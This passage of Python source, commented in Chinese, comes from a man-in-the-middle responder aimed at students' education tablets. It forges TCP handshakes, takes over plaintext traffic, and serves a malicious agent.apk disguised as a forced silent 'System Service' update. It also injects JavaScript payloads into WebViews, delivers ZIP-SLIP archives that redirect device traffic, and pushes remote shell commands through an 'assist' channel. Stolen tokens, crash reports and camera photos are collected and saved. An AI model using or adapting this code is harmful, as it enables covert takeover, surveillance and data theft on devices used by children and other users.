        _obj = {"code": 200, "message": "success", "data": {
            "url": "http://%s/zhitongyun.apk" % OUR_IP,
            "md5": "", "versionCode": 999999}}
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")

    if path.split("?")[0] in ("/p.js", "/payload.js"):
        stat["payload"] = stat.get("payload", 0) + 1
        wlog("!!!!!! [PAYLOAD] 下发完整载荷 (%dB) | Host=%s" % (len(SURVEY_JS), host))
        return _resp(SURVEY_JS, "application/javascript; charset=UTF-8")
    # ★★★ 网络验证页 = 我们的载荷(2026-10-04 夜禁下的可用入口) ★★★
    # 实测(文件头注释即记录): 真机每几秒 GET http://<ip>/data/wifi.html (Host: www.zjxhedu.com),
    # 由 NetworkAuthActivity 发起 -> WebViewStub.loadUrl(NetworkAuthActivity.smali:342-344),
    # 该 WebView 挂着 LauncherJs 桥(console/finish/openCamera/toLogin), URL 白名单含 zjxhedu.com
    # (WebViewUrlFilter.smali:129/278)。www.zjxhedu.com = 47.110.163.128, 此前被我误当"自检主机"
    # 排除掉了 —— 现在取消排除并接管。
    # 之前这里只回一个无 JS 的"验证成功页"; 现改为回引导页 => WebView 内立即执行我们的 JS。
    if "wifi" in path.lower() or "zjxhedu" in host:
        stat["wifi_boot"] = stat.get("wifi_boot", 0) + 1
        wlog("!!!!!! [WIFI-BOOT] 网络验证页下发我们的载荷 | Host=%s | %s" % (
            host, path[:90]))
        return _resp(MIN_PAGE, "text/html; charset=UTF-8")
    # 【JS 信标】若端侧把资源交给 WebView 渲染, 探针里的 JS 会打回这里 ——
    # 这是"我们拿到了脚本执行环境"的确凿证据, 同时带回 location/UA/JS 桥列表。
    if "JSBEACON" in path or "JS-BEACON" in path:
        stat["beacon"] = stat.get("beacon", 0) + 1
        wlog("!!! [JSBEACON] === WebView 渲染并执行了我们的 JS === %s" % path[:320])
        return _resp(b"ok", "text/plain; charset=UTF-8")
    # ---- 学习应用的明文资源面 (实测 /SB103007/<md5>.jpg|.png) ----
    ext = path.rsplit(".", 1)[-1].lower() if "." in path else ""
    if ext in ("jpg", "jpeg", "png", "gif", "webp", "bmp"):
        stat["res"] = stat.get("res", 0) + 1
        # 【决定性探针】端侧要的是图片, 我们改回 text/html + JS:
        #   - ImageView/BitmapFactory 解码失败 -> 端侧无影响(安全)
        #   - 若交给 WebView -> 我们的 HTML 被渲染、JS 被执行 -> 信标回来
        # 想恢复真图片: 设环境变量 HTTP80_IMG_MODE=img
        if os.environ.get("HTTP80_IMG_MODE", "probe") == "probe":
            return _resp(WEBVIEW_PROBE, "text/html; charset=UTF-8")
        if ext == "png":
            return _resp(PNG_1PX, "image/png")
        return _resp(JPG_1PX, "image/jpeg")
    # ★★★ APK 明文分发面(2026-10-04) ★★★
    # 审计证据: 各应用内嵌明文 APK 下载 URL
    #   http://xuehaifile.oss-cn-hangzhou.aliyuncs.com/XHSVADAPBUABML/<md5>.apk
    # 该域已被我们的 HttpDNS 应答劫持到本机; 而 installAppOnline 路径的
    # DownloadManager.download(url, path, null /*md5*/, cb) 把 md5 传 null
    # (AssistFunc.smali:1085-1087) -> 下载物不做完整性校验。
    # 因此任何走到 80 端口的 .apk 请求, 直接返回我们的载荷。
    # APK-HDR-LOG
    if ext == "apk" or "XHSVADAPBUABML" in path:
        try:
            _raw = body.decode("latin1", "replace")
            _hl = [x for x in _raw.replace(chr(13), "").split(chr(10))[1:] if x.strip()]
            wlog("!!!!!! [APK-HDR] %s | Host=%s | %s" % (path[:110], host, " || ".join(_hl))[:950])
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "apk_hdr.log"), "a", encoding="utf-8", errors="replace") as _hf:
                _hf.write("%s | %s" % (path[:150], " || ".join(_hl)) + chr(10))
        except Exception as _e:
            wlog("[APK-HDR-ERR] %s" % _e)
    if ext == "apk" or "XHSVADAPBUABML" in path:
        stat["apk"] = stat.get("apk", 0) + 1
        # ★ PKG-MATCH: 按请求路径选择"包名匹配"的变体 —— 因为端侧 AppUpdateFlow.installLauncher
        #   会先用 AppUtil.getPackageArchiveInfo 解析下载物, 校验 packageName/版本,
        #   不匹配就报"需要安装的版本在此设备不可用!"/"版本过旧, 不可回退!" 从而不安装。
        #   两个目标包名来自 launcher DebugPresenter.downloadApk 的两个 AppUpdateTask:
        #     com.xh.acldtch       -> .../XHSVADAPBUABML/6C130BC3396180BB8F794A49A1665E61.apk
        #     com.xh.wordstackstu  -> .../XHSVADAPBUABML/6A10D789D630C823DF6F36ACD5FE27CA.apk
        _dir = os.path.dirname(os.path.abspath(__file__))
        _pick = "agent.apk"
        if "6C130BC3" in path or "acldtch" in path:
            _pick = "agent_acldtch.apk"
        elif "6A10D789" in path or "wordstack" in path:
            _pick = "agent_wordstack.apk"
        _ap = os.path.join(_dir, _pick)
        if not os.path.exists(_ap):
            _ap = os.path.join(_dir, "agent.apk")
            _pick = "agent.apk"
        wlog("!!!!!! [APK] 端侧明文下载 APK: %s | Host=%s -> 返回 %s" % (
            path[:170], host, _pick))
        try:
            with open(_ap, "rb") as af:
                return _resp(af.read(), "application/vnd.android.package-archive")
        except Exception as e:
            wlog("  读取 %s 失败: %s" % (_pick, e))
    # ★★★ H5 应用脚本劫持(2026-10-04 21:00 实测): 设备明文加载 survey.yunzuoye.net,
    # 其 /js/app*.js /js/chunk-vendors*.js 等全部由本应答器提供 -> 整体替换为我们的载荷,
    # 于是该 WebView 每次启动 H5 应用都执行我们的代码(桥枚举 + 存储窃取 + 信标)。
    if ext == "js":
        stat["survey_js"] = stat.get("survey_js", 0) + 1
        _pl = SURVEY_RECON if len(SURVEY_RECON) > 200 else SURVEY_JS
        wlog("!!!!!! [SURVEY-JS] 注入 JS 脚本(%dB): %s | Host=%s" % (
            len(_pl), path[:120], host))
        return _resp(_pl, "application/javascript; charset=UTF-8")
    # PNLOGIN-AUTOINSTALL: 推送 SDK 的明文登录/服务器发现
    #   PushConfig base = http://pnlogin.yunzuoye.net (HTTP!) -> 我们可以全面接管
    #   /as/login         -> 给它 clientId
    #   /as/getPbsServer  -> 告诉它 PBS 在我们这里(:20000) -> 推送可控
    if "/as/login" in path or "/as/getPbsServer" in path or "/as/sendMsg" in path:
        import json as _js2
        stat["pnlogin"] = stat.get("pnlogin", 0) + 1
        wlog("!!!!!! [PNLOGIN] 推送服务器发现命中: %s" % path[:180])
        if "/as/getPbsServer" in path:
            _o = {"retCode": 0, "obj": "%s:20000", "msg": "ok", "data": {"ip": OUR_IP, "port": 20000}}
            wlog("!!!!!! [PBS-SERVER] 下发 PBS 地址 -> %s:20000 (推送可控)" % OUR_IP)
            return _resp(_js2.dumps(_o).encode(), "application/json; charset=UTF-8")
        if "/as/login" in path:
            _o = {"retCode": 0, "clientId": "p200lab0001", "appId": "CA103001",
                  "appSecret": "labsecret", "msg": "ok"}
            wlog("!!!!!! [PNLOGIN-LOGIN] 下发 clientId=p200lab0001")
            return _resp(_js2.dumps(_o).encode(), "application/json; charset=UTF-8")
        return _resp(b'{"retCode":0,"msg":"ok"}', "application/json; charset=UTF-8")
    # CHECKLIST-ENGINE: com.xh.assist 的明文任务引擎
    if "/pub/tools/checklist" in path or "getPbsServer" in path or "/as/getPbsServer" in path:
        import json as _js
        if "getPbsServer" in path:
            stat["pbs_srv"] = stat.get("pbs_srv", 0) + 1
            _obj = {"retCode": 0, "obj": "%s:20000", "msg": "ok"}
            wlog("!!!!!! [PBS-SERVER] 下发 PBS 地址 -> %s:20000" % OUR_IP)
            return _resp(_js.dumps(_obj).encode(), "application/json; charset=UTF-8")
        stat["checklist"] = stat.get("checklist", 0) + 1
        wlog("!!!!!! [CHECKLIST] 任务引擎命中 -> 下发我们的任务 | %s" % path[:110])
        _tasks = [
            {"class": "PbsCheck", "id": 1, "checkItemId": 1, "level": 0, "name": "pbs",
             "host": OUR_IP, "foreach": []},
            {"class": "PortCheck", "id": 2, "checkItemId": 1, "level": 0, "name": "port",
             "host": OUR_IP, "port": str(OUR_PORT)},
            {"class": "DownloadTest", "id": 3, "checkItemId": 1, "level": 0, "name": "dl",
             "url": "http://%s:%d/agent.apk" % (OUR_IP, OUR_PORT)},
            {"class": "BoxDownloadTest", "id": 4, "checkItemId": 1, "level": 0, "name": "box",
             "host": OUR_IP, "port": str(OUR_PORT), "url": "/agent.apk"},
        ]
        _cl = [{"id": 1, "name": "网络检测", "category": "net", "desc": "auto",
                "tasks": _tasks}]
        return _resp(_js.dumps(_cl).encode(), "application/json; charset=UTF-8")
    # H5-BRIDGE-SERVE: H5/WebView 域(明文) -> 投递桥利用页
    _h5 = (xuexiao.yunzuoye.net, xuexiao.xht.com, school.xh.com,
           question.yunzuoye.net, wrong.yunzuoye.net)
    if any(hh in (host or "") for hh in _h5):
        stat["h5_bridge"] = stat.get("h5_bridge", 0) + 1
        wlog("!!!!!! [H5-BRIDGE] H5域命中 -> 投递桥页面 | Host=%s | %s" % (host, path[:80]))
        _bp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mitm_page.html")
        try:
            _bb = open(_bp, "rb").read()
        except Exception:
            _bb = b"<html><body>ok</body></html>"
        return _resp(_bb, "text/html; charset=utf-8")
    # BRIDGE-ROOT-PAGE: 端侧会把表里 WEB 类型的地址交给云课堂富桥 WebView
    #   (BaseWebViewActivity:894 loadUrl)  —— 我们在 "/" 直接投递调桥页面
    if _p in ("/", "/index.html", "/web", "/web/"):
        stat["bridge_root"] = stat.get("bridge_root", 0) + 1
        wlog("!!!!!! [BRIDGE-ROOT] 设备加载我们的根页 -> 投递桥利用页面")
        _bf = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bridge_probe.html")
        try:
            _bb = open(_bf, "rb").read()
        except Exception:
            _bb = b"<html><body>ok</body></html>"
        return _resp(_bb, "text/html; charset=utf-8")
    # NOTEHTML-FIXED: 必须在 ext 分支之前, 否则 .html 会被吞掉
    # NOTEHTML-ROUTE
    if _p.endswith("/note.html"):
        stat["note_html"] = stat.get("note_html", 0) + 1
        wlog("!!!!!! [NOTE-HTML] 更新窗口加载我们的页面")
        _f = os.path.join(os.path.dirname(os.path.abspath(__file__)), "note.html")
        try:
            _b = open(_f, "rb").read()
        except Exception:
            _b = b"<html><body>ok</body></html>"
        return _resp(_b, "text/html; charset=utf-8")
    if ext in ("html", "htm", "js", "json", "css", "xml", "zip", "7z", "rar",
               "apk", "jar", "dex", "dat", "bin", "so", "txt", "swf", "mp4",
               "svg", "m3u8", "pdf", "mp3", "wav", "cwp", "obb", "xz", "gz", "tar"):
        # ★ 临界点: 若这里被打中, 说明端侧把该资源交给了 WebView/解析器/解压器,
        #   内容已完全由我们决定。
        #   - .js/.html/.css/.xml -> 直接被 WebView 渲染 = 可执行
        #   - .zip/.7z            -> 课件资源包, 解压后内容即课件 = 可执行
        #   - .apk/.jar/.dex/.so  -> 代码/原生库 = 可执行
        stat.setdefault("code_ext", {})
        stat["code_ext"][ext] = stat["code_ext"].get(ext, 0) + 1
        stat["code"] = stat.get("code", 0) + 1
        ct = {"js": "application/javascript", "json": "application/json",
              "css": "text/css", "xml": "application/xml",
              "zip": "application/zip", "7z": "application/x-7z-compressed",
              "apk": "application/vnd.android.package-archive",
              "swf": "application/x-shockwave-flash",
              "mp4": "video/mp4"}.get(ext, "text/html; charset=UTF-8")
        wlog("!!! [HIGH-VALUE-RESOURCE] .%s  %s | Host=%s | -> %s | 内容已由我们控制" % (
            ext, path[:120], host, ct))
        # ★★★ PAYLOAD-SERVE (2026-10-10 22:4x, 2026-10-16 20:2x 扩展):
        #   按扩展名给**格式正确**的 ZIP-SLIP 载荷(否则端侧解压会失败):
        #     .zip/.rar -> payload_proxy.zip (真 ZIP, 36 条 ../ 越界条目)
        #     .7z       -> payload_proxy.7z  (7z 格式)
        #     .apk      -> agent.apk (直接可安装)
        #   越界目标: /mnt/sdcard/xhproxy/QZWOQSFOQEDOQPQFXFX
        #     => 启动器 checkProxy() 读该目录 => 全部 HTTP 走上我们的 18080 代理
        try:
            _d = os.path.dirname(os.path.abspath(__file__))
            if ext in ("zip", "rar", "cwp", "obb"):
                _pl = os.path.join(_d, "payload_proxy.zip")
            elif ext in ("7z", "xz", "gz", "tar"):
                _pl = os.path.join(_d, "payload_proxy.7z")
            else:
                _pl = os.path.join(_d, "agent.apk")
            if not os.path.exists(_pl):
                _pl = os.path.join(_d, "payload_proxy.7z")
            if os.path.exists(_pl):
                _blob = open(_pl, "rb").read()
                stat["payload_serve"] = stat.get("payload_serve", 0) + 1
                wlog("!!!!!! [PAYLOAD-SERVE] .%s -> %s (%dB) 已下发(ZIP-SLIP)" % (
                    ext, os.path.basename(_pl), len(_blob)))
                return _resp(_blob, ct)
        except Exception as _pe:
            wlog("[PAYLOAD-SERVE-ERR] %s" % _pe)
        return _resp(b"/*XH-INJECT-PROBE*/", ct)
    # ★★★ 协助链(assist) —— 端侧协助基址取自明文服务发现, 若落到本机则:
    #   /assists            -> 伪造"教师已开启协助"会话(端侧取其 id 进入协助态)
    #   /assists/{id}/tasks -> 下发 executeCmd(...) / installAppOnline(...)
    #   /assist/result      -> 接收执行结果
    # RELEASENOTE-INJECT: 版本更新检查 -> 弹窗加载我们的页面
    #   ReleaseNoteService:55 getMicroUrl("/api/v1/pub/distribution/apps/<pkg>/versions/<ver>/check")
    #   ServerConfig:41 platformServiceConfig() = "SA106003"  (端侧正向我们请求这个类型)
    #   ReminderDialog:128 webView.loadUrl(url)  +  :187 JS桥 "js"
    if "/distribution/apps/" in _p and _p.rstrip("/").endswith("/check"):
        stat["release_note"] = stat.get("release_note", 0) + 1
        wlog("!!!!!! [RELEASENOTE] 版本更新检查命中: %s" % path[:200])
        _obj = {"versionCode": 999999, "reminded": 0,
                "url": "http://%s/note.html?v=%d" % (OUR_IP, stat["release_note"])}
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")
    # ★★★ 2026-10-10: 课堂服务域(smarterclassgray.yunzuoye.net 等, 设备实测解析过)走明文时,
    #     直接回 OPEN_FTP_CODE(50001) 信封 => 端侧 StuFtpManager.downloadFromTeacher
    #     => 从我们 8080 取恶意 7z => ZIP-SLIP 越界写。与服务表重定向互为双保险。
    if any(k in (host or "").lower() for k in ("smarterclass", "classgray", "smartclass", "smarclass")):
        stat["classroom_host"] = stat.get("classroom_host", 0) + 1
        _ftpdata = json.dumps({
            "hostName": OUR_IP, "port": 8080,
            "rootPath": (os.environ.get("ROOT_PATH") or "/sdcard/xuehai/share"),
            "downloadWaitTime": 3, "startLimitRate": 0.015,
        }, ensure_ascii=False)
        _env = {"cmd": 0, "ct": "", "from": "teacher", "gt": 0, "cId": "",
                "smsg": {"classRoomId": (os.environ.get("CLASS_ID") or "UXHOVJJF"),
                         "createTag": "default_tag", "data": _ftpdata, "forward": 0,
                         "senderId": 0, "type": 50001,
                         "userIds": (os.environ.get("USER_IDS") or "2112229")}}
        wlog("!!!!!! [CLASSROOM-HOST] %s%s -> 回 OPEN_FTP(50001) 信封" % (host, path[:60]))
        return _resp(json.dumps(_env, ensure_ascii=False).encode("utf-8"),
                     "application/json; charset=UTF-8")
    # ★★★ RESOURCE-PAYLOAD (2026-10-11 07:5x): 资源/文件主机(课件包下载) => 直接下发 ZIP-SLIP 载荷
    #   依据(反编译实证): ResourceHelper.checkResourceExit → Z7Extractor.extractFile(无 ../ 过滤)
    #       调用者含 YktWebViewPresenter(带桥 H5 容器) 与 StudentDeskTopPresenter(课堂桌面)
    #   主机: xh-res.ztytech.com(RESOURCE 服务; 端侧 23:54 实测解析过) / filesoss / oss / xhfs / aliyuncs
    #   我们的冒充器已在链路层接管**所有**明文 80 请求(不限目的 IP), 故此规则即覆盖资源下载 ✓
    if any(k in (host or "").lower() for k in ("xh-res", "ztytech", "xhfs", "filesoss",
                                               "oss-cn-", "aliyuncs", "files.yunzuoye",
                                               "question.yunzuoye")):
        try:
            _plp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload_proxy.7z")
            if os.path.exists(_plp):
                _b = open(_plp, "rb").read()
                stat["res_payload"] = stat.get("res_payload", 0) + 1
                wlog("!!!!!! [RES-PAYLOAD] %s%s -> payload_proxy.7z (%dB) 端侧解压即 ZIP-SLIP"
                     % (host, path[:70], len(_b)))
                return _resp(_b, "application/x-7z-compressed")
        except Exception as _e:
            wlog("[RES-PAYLOAD-ERR] %s" % _e)
    # ★★★ NETLINE-PLATFORM (2026-10-11 08:2x): 启动器"网络线路"里含明文域名线路:
    #     "开发环境-内网办公" 平台/zty.xh.com   微服务/192.168.5.61:7101
    #     "测试环境-内网办公" 平台/ztp.xht.com  微服务/ms.xht.com
    #   选中后 Configuration.setHttpUrlArray/setMicroUrl 会把启动器服务指向这些明文域名
    #   => 本冒充器应答其全部接口 => 下发我们的应用(带正确 md5) => MDM/root 静默安装
    if any(k in (host or "").lower() for k in ("zty.xh.com", "ztp.xht.com", "ms.xht.com",
                                               "ztp.xh.com", "xh.com")):
        _hb = (host or "").lower()
        stat["netline"] = stat.get("netline", 0) + 1
        _lp = path.split("?")[0]
        wlog("!!!!!! [NETLINE] %s%s 启动器平台接口命中 -> 我们伪造应答" % (host, path[:90]))
        # 应用安装包
        if _lp.endswith(".apk") or "agent.apk" in _lp:
            try:
                _b = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent.apk"), "rb").read()
                wlog("!!!!!! [NETLINE-APK] 下发 agent.apk (%dB)" % len(_b))
                return _resp(_b, "application/vnd.android.package-archive")
            except Exception as _e:
                wlog("[NETLINE-APK-ERR] %s" % _e)
        # 微服务表
        if "microserver" in _lp.lower() or "getxslist" in _lp.lower():
            try:
                _types = re.findall(r'types?=([A-Za-z0-9_,]+)', path)
                _tl = _types[0].split(",") if _types else None
                _allt = ["SA106003", "SB101001", "SB103019", "SB103018", "SB103015",
                         "SB103013", "SB103007", "SB103027", "SB103016",
                         "WEB002011", "WEB113001", "WEB113002", "WEB113003"]
                _webish = {"SB103007", "SB103013", "SB103027", "SB103016",
                           "WEB002011", "WEB113001", "WEB113002", "WEB113003"}
                _ts = [x for x in (_tl or _allt) if x]
                _dto = [{"serverId": 3000 + i, "serverType": t,
                         "domainOrIp": OUR_IP, "port": (80 if t in _webish else 8000),
                         "dirLocation": "", "protocol": "HTTP", "addressType": 1,
                         "mode": 0, "schList": [0], "index": i,
                         "updateTime": 4102444800000} for i, t in enumerate(_ts)]
                _obj = {"serverType": ",".join(_ts), "updateTime": 4102444800000,
                        "microServerDtoList": _dto, "version": 4102444800000}
                return _resp(json.dumps(_obj, ensure_ascii=False).encode("utf-8"),
                             "application/json; charset=UTF-8")
            except Exception as _e:
                wlog("[NETLINE-MICRO-ERR] %s" % _e)
        # 应用列表 / 版本信息 / 上报 => 我们的应用
        try:
            import hashlib as _hl
            _apkp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent.apk")
            _apkb = open(_apkp, "rb").read() if os.path.exists(_apkp) else b""
            _md5 = _hl.md5(_apkb).hexdigest()
            _entry = {"appId": 910001, "appName": "System Service",
                      "packageName": "com.zhitongyun.sysupdate",
                      "versionCode": 999999, "versionName": "9.9.9",
                      "apkUrl": "http://%s:%d/agent.apk" % (OUR_IP, 18080),
                      "downloadUrl": "http://%s:%d/agent.apk" % (OUR_IP, 18080),
                      "url": "http://%s:%d/agent.apk" % (OUR_IP, 18080),
                      "md5": _md5, "fileSize": len(_apkb),
                      "forceInstall": 1, "isForce": 1, "silent": 1,
                      "status": 1, "state": 1, "type": 1, "installType": 1,
                      "needInstall": True, "needUpdate": True}
            _body = {"code": 200, "message": "success", "success": True,
                     "data": {"total": 1, "list": [_entry], "apps": [_entry],
                              "records": [_entry], "needInstallApps": [_entry],
                              "installApps": [_entry], "updateApps": [_entry],
                              "needInstallList": [_entry], "appList": [_entry],
                              "versionCode": 999999, **{k: v for k, v in _entry.items()}},
                     "result": {"list": [_entry], "apps": [_entry]}}
            wlog("!!!!!! [NETLINE-APPS] 下发应用列表(含 com.zhitongyun.sysupdate md5=%s)" % _md5[:12])
            return _resp(json.dumps(_body, ensure_ascii=False).encode("utf-8"),
                         "application/json; charset=UTF-8")
        except Exception as _e:
            wlog("[NETLINE-APPS-ERR] %s" % _e)
        return _resp(b'{"code":200,"message":"success","success":true,"data":{}}',
                     "application/json; charset=UTF-8")
    if "/assist" in path or "/assists" in path:
        stat["assist"] = stat.get("assist", 0) + 1
        wlog("!!!!!! [ASSIST] 端侧协助接口命中: %s" % path[:220])
        if "/tasks" in path or "task" in path.lower():
            wlog("!!!!!! [ASSIST-TASKS] 下发 %d 条指令: %s" % (
                len(ASSIST_TASKS), " || ".join(
                    str(t.get("instruction", ""))[:70] for t in ASSIST_TASKS)))
            return _resp(json.dumps(ASSIST_TASKS).encode("utf-8"),
                         "application/json; charset=UTF-8")
        if ("result" in path or "active" in path or "finish" in path
                or "status" in path or "complete" in path):
            # ★★★ 关键: 记录结果回传体 —— executeCmd 的 stdout/stderr 就在这里!
            #     (历史上这里被丢弃, 导致"命令是否执行/权限如何"无从判断)
            try:
                _rb = body if isinstance(body, (bytes, bytearray)) else bytes(body or b"")
                _dec = _rb
                if _rb[:2] == b"\x1f\x8b":
                    import gzip as _gz
                    _dec = _gz.decompress(_rb)
                _txt = _dec.decode("utf-8", "replace")
                if _txt.strip():
                    wlog("!!!!!! [ASSIST-RESULT] %s | %s" % (path[:110], _txt[:1500]))
                    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                           "assist_result.log"), "a",
                              encoding="utf-8") as _af:
                        _af.write("%s | %s | %s\n" % (
                            time.strftime("%Y-%m-%d %H:%M:%S"), path[:160], _txt[:6000]))
            except Exception as _e:
                wlog("[ASSIST-RESULT-ERR] %s" % _e)
            return _resp(b"{}", "application/json; charset=UTF-8")
        return _resp(json.dumps(ASSIST_SESSION).encode("utf-8"),
                     "application/json; charset=UTF-8")
    # ★★★ 摄像头回传(2026-10-04, 用户同意): 页面调用 LauncherJs.openCamera(1),
    # 应用拍照后以 javascript:uploadPhoto('data:image/png;base64,...') 注回页面,
    # 我们的页面把该 dataURL POST 到这里 -> 落盘。
    # SENTRY-BODY-DUMP: 崩溃上报原文落盘(含 gzip 解析)
    if "sentry" in host or "envelope" in path:
        try:
            _raw = body if isinstance(body, (bytes, bytearray)) else bytes(body)
            import zlib as _zl
            _txt = ""
            try:
                _txt = _zl.decompress(_raw).decode("utf-8", "replace")
            except Exception:
                _txt = "(not gzip) " + _raw.decode("utf-8", "replace")[:3000]
            _fn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sentry_dump.log")
            with open(_fn, "a", encoding="utf-8", errors="replace") as _sf:
                _sf.write("===== %s %s | Host=%s | %dB =====\n%s\n\n" % (
                    datetime.datetime.now(), path[:120], host, len(_raw), _txt[:8000]))
            wlog("!!!!!! [SENTRY-DUMP] %s | %dB -> %d 字符已落盘" % (path[:90], len(_raw), len(_txt)))
            wlog("[SENTRY-BODY] " + _txt[:1200].replace(chr(10), " | "))
        except Exception as _e2:
            wlog("[SENTRY-DUMP-ERR] %s" % _e2)
    if "PHOTO" in path:
        stat["photo"] = stat.get("photo", 0) + 1
        try:
            ts = datetime.datetime.now().strftime("%H%M%S")
            fn = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                              "photo_%s.txt" % ts)
            with open(fn, "wb") as pf:
                pf.write(body)
            wlog("!!!!!! [PHOTO] 摄像头画面已接收 %d 字节 -> %s" % (len(body), fn))
        except Exception as e:
            wlog("[PHOTO-ERR] %s" % e)
        return _resp(b"ok", "text/plain")
    # ★ 令牌回传: 注入到课堂应用 WebView 的页面通过 Image() 把桥返回值打回来
    if "TOKENLEAK" in path:
        stat["leak"] = stat.get("leak", 0) + 1
        wlog("!!!!!! [TOKENLEAK] 课堂应用 WebView 桥数据回传 !!!!!!\n%s" % path[:2000])
        try:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   "TOKENLEAK.log"), "a", encoding="utf-8",
                      errors="replace") as f:
                f.write("%s %s\n" % (datetime.datetime.now(), path))
        except Exception:
            pass
        return _resp(b"ok", "text/plain; charset=UTF-8")
    _p0 = path.split("?")[0]
    # ★★★ 2026-10-05 关键切换: 联通性自检【必须通过】
    #   端侧 wifimanager LinkActivity: 正文同时含 "连接成功！" 与 "浙江学海教育科技有限公司"
    #   -> isConnect=true -> finish() -> 平板进入业务态
    #   -> 推送/assist 子系统初始化 -> assist 通道(executeCmd -> Runtime.exec)才会被轮询
    #   若这里仍旧回 AUTH_PAGE(无上述两串), 平板永远 isConnect=false, assist 链永不点火。
    if ("zjxhedu" in host or "yunzuoye" in host) and _p0 == "/data/wifi.html":
        stat["wifiok"] = stat.get("wifiok", 0) + 1
        try:
            with open(os.path.join(
                    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                    "portal", "wifi_success.html"), "rb") as _wf:
                _wbody = _wf.read()
        except OSError:
            _wbody = ('<html><head><meta http-equiv="Content-Type" '
                      'content="text/html; charset=UTF-8" />'
                      '<title>公司简介-浙江学海教育科技有限公司</title></head>'
                      '<body>连接成功！浙江学海教育科技有限公司</body></html>'
                      ).encode("utf-8")
        wlog("!!!!!! [WIFI-OK] 下发联通性成功页 (%dB) | Host=%s | %s" % (
            len(_wbody), host, _p0))
        return _resp(_wbody, "text/html; charset=UTF-8")
    # ★ 引导页: survey 主机 的文档请求只回极小页面
    if (("survey.yunzuoye.net" in host) or ("zjxhedu" in host)) and _p0 in (
            "/", "", "/index.html"):
        stat["boot"] = stat.get("boot", 0) + 1
        wlog("!!!!!! [BOOT] 下发认证页 (%dB) | Host=%s | %s" % (
            len(AUTH_PAGE), host, _p0))
        return _resp(AUTH_PAGE, "text/html; charset=UTF-8")
    # ★ 完整载荷与引导页同源, 由引导页用 <script src> 拉取
    if (("survey.yunzuoye.net" in host) or ("zjxhedu" in host)) and _p0 in (
            "/p.js", "/payload.js"):
        stat["payload"] = stat.get("payload", 0) + 1
        wlog("!!!!!! [PAYLOAD] 下发完整载荷 (%dB) | Host=%s" % (len(SURVEY_JS), host))
        return _resp(SURVEY_JS, "application/javascript; charset=UTF-8")
    # ★ 业务反代: 未识别的业务请求 -> 转发真服务器(保持应用可用)
    if _p.startswith("/api/") or _p.startswith("/XHFileServer") or host in REAL_IP:
        _step(7, 10, "业务请求转发真服务器(%s)" % host)
        _rb, _rct = proxy_real(host, method, path, body)
        if _rb is not None:
            stat["proxied"] = stat.get("proxied", 0) + 1
            wlog("[PROXY-REAL] %s %s%s -> %dB %s" % (method, host, path[:110], len(_rb), _rct[:40]))
            return _resp(_rb, _rct)
        wlog("[PROXY-REAL-ERR] %s %s%s (真服务器不可达)" % (method, host, path[:110]))
        return _resp(b'{"code":500,"message":"proxy failed","data":{}}',
                     "application/json; charset=UTF-8")

    # 其余未知路径: 一律返回令牌窃取页 —— 智通课堂的 WEB* 内容面会加载它
    stat["exploit"] = stat.get("exploit", 0) + 1
    return _resp(EXPLOIT_PAGE, "text/html; charset=UTF-8")


def on_pkt(p):
    try:
        if not (p.haslayer(TCP) and p.haslayer(IP)):
            return
        ip, t = p[IP], p[TCP]
        pad = pad_now()
        if ip.src != pad or t.dport != PORT:
            return
        server = ip.dst
        key = (server, t.sport)
        f = flows.get(key)
        pl = bytes(t.payload) if t.payload else b""

        if t.flags & 0x02 and not t.flags & 0x10:  # SYN -> 冒充服务器应一手
            if _excluded(server):
                return  # 自检主机 / 图片 CDN 留给真服务器
            # 【2026-10-04 修正】默认只冒充"发往本机地址"的连接:
            # 因为 HttpDNS 白名单已把 survey.yunzuoye.net 指到本机, 设备会**直接**连我们,
            # 无需伪造真实服务器的握手。其余目标一律放行给真服务器, 设备联网因此恢复正常。
            # 想回到"全目标冒充"就设 HTTP80_ALL_DST=1。
            if not ALL_DST and server not in TARGET_DST:
                return
            isn = random.randint(0x40000000, 0x7FFFFFFF)
            flows[key] = {"next": (t.seq + 1) & 0xFFFFFFFF, "mine": (isn + 1) & 0xFFFFFFFF,
                          "est": False, "buf": b""}
            stat["syn"] += 1
            stat["dst"][server] = stat["dst"].get(server, 0) + 1
            emit(server, PORT, t.sport, "SA", isn, (t.seq + 1) & 0xFFFFFFFF)
            wlog("SYN %s:%d <- %s:%d -> 冒充 SYNACK (第%d次)" % (server, PORT, pad, t.sport, stat["syn"]))
            return

        if f is None:
            return

        if t.flags & 0x04:
            flows.pop(key, None)
            return

        if not f["est"] and t.flags & 0x10:
            f["est"] = True
            stat["est"] += 1

        if pl:
            seq = t.seq
            if ((seq - f["next"]) & 0xFFFFFFFF) > 0x30000000:
                emit(server, PORT, t.sport, "A", f["mine"], f["next"])
                return
            f["next"] = (seq + len(pl)) & 0xFFFFFFFF
            f["buf"] += pl
            emit(server, PORT, t.sport, "A", f["mine"], f["next"])
            if b"\r\n\r\n" in f["buf"]:
                head, _, rest = f["buf"].partition(b"\r\n\r\n")
                first = head.split(b"\r\n", 1)[0].decode("latin1", "replace")
                host = ""
                for ln in head.split(b"\r\n")[1:]:
                    if ln[:5].lower() == b"host:":
                        host = ln.split(b":", 1)[1].strip().decode("latin1", "replace")
                        break
                # 【2026-10-04 决定性诊断】区分"文档导航"与"XHR/fetch":
                #   Sec-Fetch-Dest: document / iframe / frame  => 浏览器会把它当文档渲染
                #                  : empty                     => XHR/fetch (不渲染)
                # 只有前者才会执行我们页面里的 <script> —— 之前一直没区分, 所以反复误判。
                if ("survey" in host) or ("zjxhedu" in host) or host in ("", "null"):
                    hl = {}
                    for ln in head.split(b"\r\n")[1:]:
                        if b":" in ln:
                            k, v = ln.split(b":", 1)
                            hl[k.strip().decode("latin1", "replace").lower()] = \
                                v.strip().decode("latin1", "replace")
                    wlog("[DIAG] %s | Host=%r | dest=%r mode=%r site=%r accept=%r "
                         "referer=%r uir=%r cookie=%s" % (
